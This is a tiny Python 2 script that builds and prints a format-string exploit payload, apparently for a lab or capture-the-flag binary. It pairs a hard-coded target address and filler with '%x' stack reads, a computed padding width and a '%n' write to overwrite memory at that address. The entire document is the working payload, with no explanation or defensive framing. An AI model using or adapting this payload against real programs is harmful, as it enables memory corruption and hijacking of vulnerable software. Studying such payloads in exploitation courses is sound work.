#!/usr/bin/python

w1 = '\x14\xc0\x04\x08JUNK'

b1 = 0xaa

n1 =  b1 - 0x18

form = '%x%x%' + str(n1) + 'x%n'

print w1 + form
